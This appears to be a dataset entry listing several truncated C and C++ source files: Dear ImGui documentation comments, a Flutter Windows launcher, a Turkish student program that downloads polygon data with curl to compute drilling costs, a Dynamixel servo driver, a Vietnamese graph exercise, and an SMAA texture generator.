APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <graphics.h>\r\n#include <math.h>\r\n#include <curl/curl.h>\r\n\r\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream); // curl \r\nvoid eksenciz(); // 2 boyutlu uzay duzlemini cizdiriyoruz\r\nchar* parcala(const char* str); //alinan verinin kullanilacak kismini belirliyor  \r\nint* sayilastir(char *a); //stringi integera ceviriyor\r\nint sekilsayisi(int* sayilar, int boyut,int *ay); // veride kac sekil oldugunu belirliyor\r\nvoid alanVeKareSayisiYazdir(int* coordinates, int size, float *topl,int* bks); // Alan ve Plartform degerlerini buluyor\r\nconst char* satir(const char* text, int line_number); // gelen veride secilen satiri donduruyor\r\nbool icindemi(int* polygon, int n, int x, int y); // birim karenin icersinde poligon bulunup bulunmadigini kontrol ediyor\r\nvoid platformbelirleme(int* polygon, int n); // plartformun oldugu kareleri griye boyuyor\r\nint platformSayisi(int* polygon, int n); // plartform sayisini donduruyor\r\n\r\nint main()\r\n{\r\n\t//Curl islemleri\r\n\tFILE *dosya;\r\n    CURL *curl;\r\n    CURLcode res;\r\n    long file_size;\r\n    int secim;\r\n\tfloat pMal; //plartform maliyeti\r\n\tint sMal; // sondaj maliyeti\r\n    curl = curl_easy_init();\r\n\r\n    if (curl) {\r\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://abilgisayar.kocaeli.edu.tr/prolab1/prolab1.txt\");\r\n\r\n        dosya = fopen(\"yaz1.txt\", \"wb\");\r\n        if (!dosya) {\r\n            fprintf(stderr, \"Dosya a\u00e7ma hatas\u00fd\\n\");\r\n            return 1;\r\n        }\r\n\r\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\r\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, dosya);\r\n\r\n        res = curl_easy_perform(curl);\r\n        fclose(dosya);\r\n\r\n        if (res != CURLE_OK) {\r\n            fprintf(stderr, \"cURL hatas\u00fd: %s\\n\", curl_easy_strerror(res));\r\n            curl_easy_cleanup(curl);\r\n            return 1;\r\n        }\r\n\t\tdosya = fopen(\"yaz1.txt\", \"r\");\r\n        fseek(dosya, 0, SEEK_END);\r\n        file_size = ftell(dosya);\r\n        rewind(dosya);\r\n\r\n        char metin[file_size + 1];\r\n        fread(metin, 1, file_size, dosya);\r\n        metin[file_size] = '\\0'; \r\n\t\tprintf(\"Cekilen veri:\\n%s\\n\\n\",metin);\r\n\t\t\r\n        printf(\"Hangi satiri cizdirmek istersiniz:\");\r\n        scanf(\"%d\", &secim);\r\n        \r\n        printf(\"\\nBirim Sondaj Maliyetini Giriniz (1-10):\");\r\n        scanf(\"%d\",&sMal);\r\n        \r\n        printf(\"\\nBirim Plartform Maliyetini Giriniz:\");\r\n        scanf(\"%f\",&pMal);\r\n        \r\n        const char* input_str = satir(metin, secim); // verideki secilen satiri input_str ye esitliyoruz \r\n\t\tprintf(\"\\nSecilen satir: %s\\n\", input_str);\r\n\t\r\n\t// input islemleri\r\n\tchar* dnm = parcala(input_str); // kullanilacak veriyi dnm ye esitle \r\n\tint* coord = sayilastir(dnm); // koordinat noktalarini integer sekilde coorda esitliyoruz\r\n\t\r\n\tint boyut= 0;\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tboyut++; // boyut bilgisi\r\n\t}\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tcoord[i] = coord[i] *16; // cizdirdi\u00f0imiz eksenin boyutlar\u00fdna uygun pikseldeki noktayi bulmak i\u00e7in 16 ile carpiyoruz \r\n\t}\r\n\tinitwindow(1920,1080); // pencere ac\r\n\tint ayrim; // iki sekil varsa ayrim indeksnin temsil eder\r\n\teksenciz();\r\n\tif(sekilsayisi(coord,boyut,&ayrim))\r\n\t{ \r\n\t\t//Tek Sekil varsa\r\n\tfloat toplmal=0;\r\n\tint birimks;\r\n \tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n    alanVeKareSayisiYazdir(coord, boyut, &toplmal,&birimks);\r\n    platformbelirleme(coord, boyut);\r\n    \r\n    printf(\"\\nToplam Plartform Sayisi:%d\\n\",birimks);\r\n    \r\n    printf(\"\\nToplam Sondaj Maliyeti: %.2f\\n\", (float(sMal) * toplmal /10.0));\r\n    \r\n\tprintf(\"\\nToplam Plartform Maliyeti: %.2f\\n\", (pMal * float(birimks)));\r\n\t\r\n\tprintf(\"\\nToplam Maliyet: %.2f\\n\",((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));\r\n\t\r\n\tprintf(\"\\nKar Miktari: %.2f\\n\", toplmal - ((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));  \t\r\n\t\t\r\n\tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n     \tchar floatStr[20];\r\n   \t \tsprintf(floatStr, \"%.2f\", toplmal);\r\n        \r\n        outtextxy(500, 20, \"Toplam Rezerv Deger:\");\r\n   \t\touttextxy(680, 20, floatStr);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t// cift sekil varsa\r\n\t\tint* sekil1 = (int*)malloc((ayrim+2)* sizeof(int)); // sekil1 in koordinatlari icim bellekte alan tuttuk\r\n\t\tint* sekil2 = (int*)malloc( (boyut - ayrim)* sizeof(int)); //sekil2 nin koordinatlari icin bellekte alan tuttuk\r\n\t\tfloat toplam_alan = 0.0;\r\n\t\tfloat tAlan= 0.0;\r\n\t\tint i=0;\r\n\t\tint boyut1=0;\r\n\t\tint boyut2=0;\r\n\t\tint tPLart = 0; //toplam plartform sayisini verecek\r\n\t\tint toplam_plartf;\r\n\t\tfor(i=0;i <= ayrim;i++)\r\n\t\t{\r\n\t\t\tsekil1[i] = coord[i];\r\n\t\t\tboyut1++;\r\n\t\t}\r\n\t\tsekil1[i+1] = '\\0';\r\n\t\tfor(;coord[i] != '\\0';i++)\r\n\t\t{\r\n\t\t\tsekil2[boyut2] = coord[i];\r\n\t\t\tboyut2++;\r\n\t\t}\r\n\t\tsekil2[boyut2+1] = '\\0';\r\n\t\tsetfillstyle(1, RED);\r\n        fillpoly(boyut1/ 2, sekil1);\r\n        fillpoly(boyut2/ 2, sekil2);\r\n        //ilk sekilin kareleri\r\n        \r\n        alanVeKareSayisiYazdir(sekil1, boyut1,&toplam_alan,&toplam_plartf);\r\n        tAlan += toplam_alan;\r\n        t",
    "// dear imgui, v1.90.5 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ                   https://dearimgui.com/faq\n// - Getting Started       https://dearimgui.com/getting-started\n// - Homepage              https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/6897 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n// - Tests & Automation    https://github.com/ocornut/imgui_test_engine\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Sponsors\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Minimize state synchronization.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed primarily for developers and content-creators, not the typical end-user!\n Some of the current weaknesses (which we aim to address in the future) include",
    "/*******************************************************************************\n* Copyright 2018 ROBOTIS CO., LTD.\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*     http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*******************************************************************************/\n\n/* Authors: Taehun Lim (Darby) */\n\n#include \"../../include/dynamixel_workbench_toolbox/dynamixel_driver.h\"\n\nDynamixelDriver::DynamixelDriver() : tools_cnt_(0), \n                                    sync_write_handler_cnt_(0), \n                                    sync_read_handler_cnt_(0),\n                                    bulk_read_parameter_cnt_(0)\n{\n\n}\n\nDynamixelDriver::~DynamixelDriver()\n{ \n  for (int i = 0; i < tools_cnt_; i++)\n  {\n    for (int j = 0; j < tools_[i].getDynamixelCount(); j++)\n    {\n      writeRegister(tools_[i].getID()[j], \"Torque_Enable\", (uint8_t)0);\n    }\n  }\n\n  portHandler_->closePort();\n}\n\nvoid DynamixelDriver::initTools(void)\n{\n  for (uint8_t num = 0; num < MAX_DXL_SERIES_NUM; num++)\n    tools_[num].initTool();\n\n  tools_cnt_ = 0;\n}\n\nbool DynamixelDriver::setTool(uint16_t model_number, uint8_t id, const char **log)\n{\n  bool result = false;\n\n  // See if we have a matching tool? \n  for (uint8_t num = 0; num < tools_cnt_; num++)\n  {\n    if (tools_[num].getModelNumber() == model_number)\n    {\n      if (tools_[num].getDynamixelCount() < tools_[num].getDynamixelBuffer())\n      {\n        // Found one with the right model number and it is not full\n        tools_[num].addDXL(id);\n        return true;\n      }\n      else\n      {\n        if (log != NULL) *log = \"[DynamixelDriver] Too many Dynamixels are connected (default buffer size is 16, the same series of Dynamixels)\";\n        return false;\n      }\n    }\n  }\n  // We did not find one so lets allocate a new one\n  if (tools_cnt_ < MAX_DXL_SERIES_NUM) \n  {\n    // only do it if we still have some room...\n    result = tools_[tools_cnt_++].addTool(model_number, id, log);\n    return result;\n  }\n  else\n  {\n    if (log != NULL) *log = \"[DynamixelDriver] Too many series are connected (MAX = 5 different series)\";\n    return false;\n  }\n\n  if (log != NULL) *log = \"[DynamixelDriver] Failed to set the Tool\";\n  return false;\n}\n\nuint8_t DynamixelDriver::getTool(uint8_t id, const char **log)\n{\n  for (int i = 0; i < tools_cnt_; i++)\n  {\n    for (int j = 0; j < tools_[i].getDynamixelCount(); j++)\n    {\n      if (tools_[i].getID()[j] == id)\n      {\n        return i;\n      }\n    }\n  }\n\n  if (log != NULL) *log = \"[DynamixelDriver] Failed to get the Tool\";\n  return 0xff;\n}\n\nbool DynamixelDriver::init(const char *device_name, uint32_t baud_rate, const char **log)\n{\n  bool result = false;\n\n  result = setPortHandler(device_name, log);\n  if (result == false) return false;\n\n  result = setBaudrate(baud_rate, log);\n  if (result == false) return false;\n\n  result = setPacketHandler(2.0f, log);\n  if (result == false) return false;\n\n  return result;\n}\n\nbool DynamixelDriver::begin(const char *device_name, uint32_t baud_rate, const char **log)\n{\n  return init(device_name, baud_rate, log);\n}\n\nbool DynamixelDriver::setPortHandler(const char *device_name, const char **log)\n{\n  portHandler_ = dynamixel::PortHandler::getPortHandler(device_name);\n\n  if (portHandler_->openPort())\n  {\n    if (log != NULL) *log = \"[DynamixelDriver] Succeeded to open the port!\";\n    return true;\n  }\n\n  if (log != NULL) *log = \"[DynamixelDriver] Failed to open the port!\";\n  return false;\n}\n\nbool DynamixelDriver::setBaudrate(uint32_t baud_rate, const char **log)\n{\n  if (portHandler_->setBaudRate((int)baud_rate))\n  {\n    if (log != NULL) *log = \"[DynamixelDriver] Succeeded to change the baudrate!\";\n    return true;\n  }\n\n  if (log != NULL) *log = \"[DynamixelDriver] Failed to change the baudrate!\";\n  return false;\n}\n\nbool DynamixelDriver::setPacketHandler(float protocol_version, const char **log)\n{\n  packetHandler_ = dynamixel::PacketHandler::getPacketHandler(protocol_version);\n\n  if (packetHandler_->getProtocolVersion() == protocol_version)\n  {\n    if (log != NULL) *log = \"[DynamixelDriver] Succeeded to set the protocol!\";\n    return true;\n  }\n\n  if (log != NULL) *log = \"[DynamixelDriver] Failed to set the protocol!\";\n  return false;\n}\n\nfloat DynamixelDriver::getProtocolVersion(void)\n{\n  return packetHandler_->getProtocolVersion();\n}\n\nuint32_t DynamixelDriver::getBaudrate(void)\n{\n  return portHandler_->getBaudRate();\n}\n\nconst char* DynamixelDriver::getModelName(uint8_t id, const char **log)\n{\n  uint8_t factor = getTool(id, log);\n  if (factor == 0xff) \n    return NULL;\n  else\n   ",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\nconst int maxDinh = 20;\n\nstruct node {\n\tint dinhKe;\n\tint trongSo;\n\tnode* link;\n};\n\nstruct danhSachKe {\n\tnode* dsk[maxDinh];\n\tint soDinh; // s\u1ed1 \u0111\u1ec9nh c\u1ee7a graph\n};\n\nvoid readFile(danhSachKe& list) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep.\";\n\t\treturn;\n\t}\n\t// cho danh s\u00e1ch = null h\u1ebft\n\tfor (int i = 0; i < maxDinh; i++)\n\t\tlist.dsk[i] = NULL;\t\n\t// Nhap s\u1ed1 \u0111\u1ec9nh t\u1ed5ng\n\tinFile >> list.soDinh;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tint soDinhKe;\n\t\tinFile >> soDinhKe;\n\t\tfor (int j = 0; j < soDinhKe; j++) {\n\t\t\tnode* newNode = new node();\n\t\t\tinFile >> newNode->dinhKe;\n\t\t\tinFile >> newNode->trongSo;\n\t\t\tnewNode->link = NULL;\n\t\t\t// Th\u00eam v\u00e0o single list theo \u0111\u1ec9nh t\u01b0\u01a1ng \u1ee9ng \n\t\t\tif (list.dsk[i] == NULL)  // ch\u01b0a c\u00f3 \u0111\u1ec9nh k\u1ec1 n\u00e0o h\u1ebft \n\t\t\t\tlist.dsk[i] = newNode;\n\t\t\telse { // \u0111\u00e3 c\u00f3 \u0111\u1ec9nh k\u1ec1 tr\u01b0\u1edbc \u0111\u00f3 th\u00eam v\u00e0o cu\u1ed1i single list \n\t\t\t\tnode* temp = list.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = newNode;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(danhSachKe list) {\n\tcout << \"GRAPH\";\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tcout << \"\\n(\" << i << \"): \";\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcout << \"(\" << pointer->dinhKe << \",\" << pointer->trongSo << \") \";\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n}\n\nint demSoCanh(danhSachKe list) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcount++;\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nint tinhBacRa(danhSachKe list, int u) {\n\tint count = 0;\n\tnode* pointer = list.dsk[u];\n\twhile (pointer)\n\t{\n\t\tcount++;\n\t\tpointer = pointer->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(danhSachKe list, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (pointer->dinhKe == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nbool canhCoTrongSoLonNhat(danhSachKe list, int& u, int& v) {\n\tnode* max = NULL;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (max == NULL) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\telse if (pointer->trongSo > max->trongSo) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\n\tif (max == NULL)\n\t\treturn false;\n\telse {\n\t\tv = max->dinhKe;\n\t\treturn true;\n\t}\n}\n\nint main() {\n\tdanhSachKe list;\n\treadFile(list);\n\txuatDanhSachKe(list);\n\tcout << \"\\nTong so canh: \" << demSoCanh(list);\n\tcout << \"\\nBac ra cua 5: \" << tinhBacRa(list, 5);\n\tcout << \"\\nBac vao cua 5: \" << tinhBacVao(list, 5);\n\tint u, v;\n\tif (canhCoTrongSoLonNhat(list, u, v))\n\t\tcout << \"\\nCanh co trong so lon nhat: (\" << u << \",\" << v << \")\";\n\telse\n\t\tcout << \"\\nKhong co canh\";\n}",
    "/**\n * Copyright (C) 2016-2017 IRIE Shinsuke\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n/*\n * smaa_areatex.cpp  version 0.4.0\n *\n * This is a part of smaa-cpp that is an implementation of\n * Enhanced Subpixel Morphological Antialiasing (SMAA) written in C++.\n *\n * This program is C++ rewrite of AreaTex.py included in the original\n * SMAA ditribution:\n *\n *   https://github.com/iryoku/smaa/tree/master/Scripts\n */\n\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n\n#include <cmath>\n\n/*------------------------------------------------------------------------------*/\n/* Type Definitions */\n\nclass Int2;\nclass Dbl2;\n\nclass Int2 {\npublic:\n\tint x, y;\n\n\tInt2() { this->x = this->y = 0; }\n\tInt2(int x) { this->x = this->y = x; }\n\tInt2(int x, int y) { this->x = x; this->y = y; }\n\n\toperator Dbl2();\n\n\tInt2 operator + (Int2 other) { return Int2(x + other.x, y + other.y); }\n\tInt2 operator * (Int2 other) { return Int2(x * other.x, y * other.y); }\n};\n\nclass Dbl2 {\npublic:\n\tdouble x, y;\n\n\tDbl2() { this->x = this->y = 0.0; }\n\tDbl2(double x) { this->x = this->y = x; }\n\tDbl2(double x, double y) { this->x = x; this->y = y; }\n\n\tDbl2 apply(double (* func)(double)) { return Dbl2(func(x), func(y)); }\n\n\toperator Int2();\n\n\tDbl2 operator + (Dbl2 other) { return Dbl2(x + other.x, y + other.y); }\n\tDbl2 operator - (Dbl2 other) { return Dbl2(x - other.x, y - other.y); }\n\tDbl2 operator * (Dbl2 other) { return Dbl2(x * other.x, y * other.y); }\n\tDbl2 operator / (Dbl2 other) { return Dbl2(x / other.x, y / other.y); }\n\tDbl2 operator += (Dbl2 other) { return Dbl2(x += other.x, y += other.y); }\n\tbool operator == (Dbl2 other) { return (x == other.x && y == other.y); }\n};\n\nInt2::operator Dbl2() { return Dbl2((double)x, (double)y); }\nDbl2::operator Int2() { return Int2((int)x, (int)y); }\n\n/*------------------------------------------------------------------------------*/\n/* Data to Calculate Areatex */\n\n/* Texture sizes: */\n/* (it's quite possible that this is not easily configurable) */\nstatic const int SUBSAMPLES_ORTHO = 7;\nstatic const int SUBSAMPLES_DIAG  = 5;\nstatic const int MAX_DIST_ORTHO_COMPAT = 16;\nstatic const int MAX_DIST_ORTHO = 20;\nstatic const int MAX_DIST_DIAG  = 20;\nstatic const int TEX_SIZE_ORTHO = 80; /* 16 * 5 slots = 80 */\nstatic const int TEX_SIZE_DIAG  = 80; /* 20 * 4 slots = 80 */\n\n/* Number of samples for calculating areas in the diagonal textures: */\n/* (diagonal areas are calculated using brute force sampling) */\nstatic const int SAMPLES_DIAG = 30;\n\n/* Maximum distance for smoothing u-shapes: */\nstatic const int SMOOTH_MAX_DISTANCE = 32;\n\n/*------------------------------------------------------------------------------*/\n/* Offset Tables */\n\n/* Offsets for subsample rendering */\nstatic const double subsample_offsets_ortho[SUBSAMPLES_ORTHO] = {\n\t0.0,    /* 0 */\n\t-0.25,  /* 1 */\n\t0.25,   /* 2 */\n\t-0.125, /* 3 */\n\t0.125,  /* 4 */\n\t-0.375, /* 5 */\n\t0.375   /* 6 */\n};\n\nstatic const Dbl2 subsample_offsets_diag[SUBSAMPLES_DIAG] = {\n\t{ 0.00,   0.00},  /* 0 */\n\t{ 0.25,  -0.25},  /* 1 */\n\t{-0.25,   0.25},  /* 2 */\n\t{ 0.125, -0.125}, /* 3 */\n\t{-0.125,  0.125}  /* 4 */\n};\n\n/* Mapping offsets for placing each pattern subtexture into its place */\nenum edgesorthoIndices\n{\n\tEDGESORTHO_NONE_NONE = 0,\n\tEDGESORTHO_NONE_NEGA = 1,\n\tEDGESORTHO_NONE_POSI = 2,\n\tEDGESORTHO_NONE_BOTH = 3,\n\tEDGESORTHO_NEGA_NONE = 4,\n\tEDGESORTHO_NEGA_NEGA = 5,\n\tEDGESORTHO_NEGA_POSI = 6,\n\tEDGESORTHO_NEGA_BOTH = 7,\n\tEDGESORTHO_POSI_NONE = 8,\n\tEDGESORTHO_POSI_NEGA = 9,\n\tEDGESORTHO_POSI_POSI = 10,\n\tEDGESORTHO_POSI_BOTH = 11,\n\tEDGESORTHO_BOTH_NONE = 12,\n\tEDGESORTHO_BOTH_NEGA = 13,\n\tEDGESORTHO_BOTH_POSI = 14,\n\tEDGESORTHO_BOTH_BOTH = 15,\n};\n\nstatic const Int2 edgesortho_compat[16] = {\n\t{0, 0}, {0, 1}, {0, 3}, {0, 4}, {1, 0}, {1, 1}, {1, 3}, {1, 4},\n\t{3, 0}, {3, 1}, {3, 3}, {3, 4}, {4, 0}, {4, 1}, {4, 3}, {4, 4}\n};\n\nstatic const Int2 edgesortho[16] = {\n\t{0, 0}, {0, 1}, {0, 2}, {0, 3}, {1, 0}, 